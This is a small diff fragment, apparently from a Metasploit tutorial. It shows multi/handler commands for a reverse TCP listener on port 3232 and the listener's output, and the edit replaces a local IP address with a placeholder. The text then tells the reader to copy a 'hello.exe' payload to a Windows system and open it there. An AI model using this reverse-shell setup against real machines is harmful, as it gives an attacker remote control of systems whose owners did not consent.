@@ -67,6 +67,6 @@ msf6 exploit(multi/handler) > set lport 3232
 msf6 exploit(multi/handler) > exploit
 ```
 ```terminal
-[*] Started reverse TCP handler on 172.20.10.4:3232 
+[*] Started reverse TCP handler on your_ip_adress:3232 
 ```
 All you have to do is copy the hello.exe file and open it on a Windows system.
